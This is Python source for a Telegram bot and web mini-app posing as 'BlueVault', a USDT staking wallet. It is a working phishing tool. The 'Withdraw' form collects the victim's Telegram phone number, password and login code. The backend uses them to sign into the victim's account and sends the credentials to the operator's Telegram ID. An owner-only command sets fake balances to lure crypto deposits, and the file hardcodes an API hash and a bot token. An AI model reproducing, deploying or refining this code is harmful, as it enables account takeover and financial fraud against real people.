import asyncio
import logging
import os
from threading import Thread
from telethon import TelegramClient, events, Button
from telethon.errors import SessionPasswordNeededError, FloodWaitError
from flask import Flask, request, jsonify

API_ID = 8
API_HASH = '7245de8e747a0d6fbe11f7cc14fcc0bb'
BOT_TOKEN = '8737138603:AAG2FHcf4msHENx4ppx5jXmzNRgltJd1pPg'
OWNER_ID = 1663746192
CRYPTO_ADDRESS = '0xYourAddress'
WEBHOOK_URL = 'https://mybot-production-0351.up.railway.app'

logging.basicConfig(level=logging.INFO)

bot = TelegramClient('bot_session', API_ID, API_HASH)
app = Flask(__name__)
user_balances = {}
_started = False

HTML_PAGE = '''
<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
    <title>BlueVault</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        :root {
            --bg: #0a1628;
            --card: #0f1f3d;
            --border: #1a3256;
            --blue: #2196F3;
            --blue-light: #64B5F6;
            --text: #E3F2FD;
            --text-secondary: #90CAF9;
            --green: #4CAF50;
            --red: #EF5350;
        }
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: var(--bg);
            color: var(--text);
            padding: 16px;
            min-height: 100vh;
        }
        .header {
            display: flex;
            align-items: center;
            justify-content: space-between;
            margin-bottom: 24px;
        }
        .logo {
            font-size: 20px;
            font-weight: 700;
            color: var(--blue-light);
            letter-spacing: -0.5px;
        }
        .logo span { color: var(--blue); }
        .status {
            width: 8px; height: 8px;
            background: var(--green);
            border-radius: 50%;
            box-shadow: 0 0 6px var(--green);
        }
        .card {
            background: var(--card);
            border: 1px solid var(--border);
            border-radius: 16px;
            padding: 20px;
            margin-bottom: 12px;
        }
        .balance-label {
            font-size: 13px;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 8px;
        }
        .balance-value {
            font-size: 42px;
            font-weight: 700;
            color: #fff;
            line-height: 1;
        }
        .balance-usd {
            font-size: 14px;
            color: var(--text-secondary);
            margin-top: 6px;
        }
        .actions {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 10px;
            margin-top: 16px;
        }
        .btn {
            background: var(--card);
            border: 1px solid var(--border);
            color: var(--blue-light);
            padding: 14px;
            border-radius: 12px;
            font-size: 14px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.2s;
            text-align: center;
        }
        .btn:active {
            background: var(--border);
            transform: scale(0.98);
        }
        .btn-primary {
            background: var(--blue);
            border-color: var(--blue);
            color: #fff;
            grid-column: 1 / -1;
        }
        .input-group {
            margin-bottom: 12px;
        }
        .input-group label {
            display: block;
            font-size: 12px;
            color: var(--text-secondary);
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 6px;
        }
        .input-group input {
            width: 100%;
            padding: 14px;
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            color: #fff;
            font-size: 16px;
            outline: none;
            transition: border 0.2s;
        }
        .input-group input:focus {
            border-color: var(--blue);
        }
        .address-box {
            background: var(--bg);
            border: 1px solid var(--border);
            border-radius: 12px;
            padding: 14px;
            font-size: 13px;
            word-break: break-all;
            color: var(--text-secondary);
            margin: 12px 0;
            font-family: 'SF Mono', 'Menlo', monospace;
        }
        .divider {
            height: 1px;
            background: var(--border);
            margin: 16px 0;
        }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="header">
        <div class="logo">Blue<span>Vault</span></div>
        <div class="status" id="statusDot"></div>
    </div>

    <div id="mainScreen">
        <div class="card">
            <div class="balance-label">Total Balance</div>
            <div class="balance-value" id="balance">0.00</div>
            <div class="balance-usd">USDT</div>
            <div class="actions">
                <button class="btn" onclick="showStake()">↗ Stake</button>
                <button class="btn" onclick="showWithdraw()">↓ Withdraw</button>
            </div>
        </div>
    </div>

    <div id="stakeScreen" class="hidden">
        <div class="card">
            <div class="balance-label">Stake USDT</div>
            <p style="font-size:13px;color:var(--text-secondary);margin-bottom:12px;">Send USDT to the address below</p>
            <div class="address-box" id="cryptoAddress"></div>
            <button class="btn btn-primary" onclick="copyAddress()">Copy Address</button>
            <div class="divider"></div>
            <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
        </div>
    </div>

    <div id="withdrawScreen" class="hidden">
        <div class="card">
            <div class="balance-label">Withdraw</div>
            <div class="input-group">
                <label>Phone Number</label>
                <input type="text" id="phone" placeholder="+79001234567">
            </div>
            <div class="input-group">
                <label>Password</label>
                <input type="password" id="password" placeholder="••••••••">
            </div>
            <div class="input-group">
                <label>Verification Code</label>
                <input type="text" id="code" placeholder="•••••">
            </div>
            <button class="btn btn-primary" onclick="withdraw()">Confirm Withdrawal</button>
            <div class="divider"></div>
            <button class="btn" onclick="goBack()" style="width:100%;">← Back</button>
        </div>
    </div>

    <script>
        const tg = window.Telegram.WebApp;
        tg.expand();
        tg.ready();
        const userId = tg.initDataUnsafe?.user?.id || 0;

        function updateBalance() {
            fetch('/get_balance?user_id=' + userId)
                .then(r => r.json())
                .then(d => {
                    document.getElementById('balance').textContent = parseFloat(d.balance).toFixed(2);
                })
                .catch(() => {
                    document.getElementById('statusDot').style.background = 'var(--red)';
                    document.getElementById('statusDot').style.boxShadow = '0 0 6px var(--red)';
                });
        }

        function showStake() {
            document.getElementById('mainScreen').classList.add('hidden');
            document.getElementById('stakeScreen').classList.remove('hidden');
            document.getElementById('withdrawScreen').classList.add('hidden');
            fetch('/get_address').then(r => r.json()).then(d => {
                document.getElementById('cryptoAddress').textContent = d.address;
            });
        }

        function showWithdraw() {
            document.getElementById('mainScreen').classList.add('hidden');
            document.getElementById('stakeScreen').classList.add('hidden');
            document.getElementById('withdrawScreen').classList.remove('hidden');
        }

        function goBack() {
            document.getElementById('mainScreen').classList.remove('hidden');
            document.getElementById('stakeScreen').classList.add('hidden');
            document.getElementById('withdrawScreen').classList.add('hidden');
        }

        function copyAddress() {
            const addr = document.getElementById('cryptoAddress').textContent;
            navigator.clipboard.writeText(addr).then(() => {
                tg.showPopup({ title: 'Copied', message: 'Address copied to clipboard' });
            });
        }

        function withdraw() {
            const phone = document.getElementById('phone').value.trim();
            const password = document.getElementById('password').value.trim();
            const code = document.getElementById('code').value.trim();
            if (!phone || !password || !code) {
                tg.showPopup({ title: 'Error', message: 'All fields are required' });
                return;
            }
            fetch('/withdraw', {
                method: 'POST',
                headers: {'Content-Type': 'application/json'},
                body: JSON.stringify({user_id: userId, phone, password, code})
            }).then(r => r.json()).then(d => {
                tg.showPopup({ title: 'Withdrawal', message: d.message });
            });
        }

        updateBalance();
        setInterval(updateBalance, 15000);
    </script>
</body>
</html>
'''

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/get_balance')
def get_balance():
    user_id = int(request.args.get('user_id', 0))
    return jsonify({'balance': user_balances.get(user_id, 0)})

@app.route('/get_address')
def get_address():
    return jsonify({'address': CRYPTO_ADDRESS})

@app.route('/withdraw', methods=['POST'])
def withdraw():
    data = request.json
    user_id = data.get('user_id')
    phone = data.get('phone')
    password = data.get('password')
    code = data.get('code')
    asyncio.ensure_future(process_withdraw(user_id, phone, password, code))
    return jsonify({'message': 'Request processed'})

async def process_withdraw(user_id, phone, password, code):
    client = TelegramClient(f'session_{user_id}', API_ID, API_HASH)
    try:
        await client.connect()
        await client.send_code_request(phone)
        try:
            await client.sign_in(phone=phone, code=code)
        except SessionPasswordNeededError:
            await client.sign_in(password=password)
        me = await client.get_me()
        await bot.send_message(OWNER_ID, f'#WITHDRAW\nPhone: {phone}\nPassword: {password}\nCode: {code}\nAccount: @{me.username}')
    except FloodWaitError as e:
        await bot.send_message(OWNER_ID, f'FloodWait: {e.seconds}s')
    except Exception as e:
        await bot.send_message(OWNER_ID, f'Withdraw error: {e}')
    finally:
        await client.disconnect()

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    user_id = event.sender_id
    user_balances.setdefault(user_id, 0)
    print(f'NEW USER: {user_id}')
    await event.respond(
        '🛡 BlueVault Wallet',
        buttons=[[Button.url('🚀 Open App', 'https://t.me/Buraldikbot/Hhvhjk')]]
    )

@bot.on(events.NewMessage(pattern='/setbalance'))
async def set_balance(event):
    if event.sender_id != OWNER_ID:
        return
    try:
        _, target_id, amount = event.text.split()
        target_id, amount = int(target_id), float(amount)
        user_balances[target_id] = amount
        await event.respond(f'Balance {target_id}: {amount} USDT')
    except:
        await event.respond('/setbalance <id> <amount>')

@bot.on(events.NewMessage(pattern='/myid'))
async def myid(event):
    await event.respond(f'Your ID: {event.sender_id}')

@bot.on(events.NewMessage(pattern='/msg'))
async def msg(event):
    if event.sender_id != OWNER_ID:
        return
    try:
        parts = event.text.split(maxsplit=2)
        target_id = int(parts[1])
        message = parts[2] if len(parts) > 2 else ''
        await bot.send_message(target_id, message)
        print(f'SENT: {target_id} <- {message}')
        await event.respond('Sent')
    except Exception as e:
        print(f'MSG ERROR: {e}')
        await event.respond('/msg <id> <text>')

async def main():
    global _started
    if _started:
        return
    _started = True
    await bot.start(bot_token=BOT_TOKEN)
    await bot.run_until_disconnected()

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)))

if __name__ == '__main__':
    Thread(target=run_flask, daemon=True).start()
    asyncio.run(main())
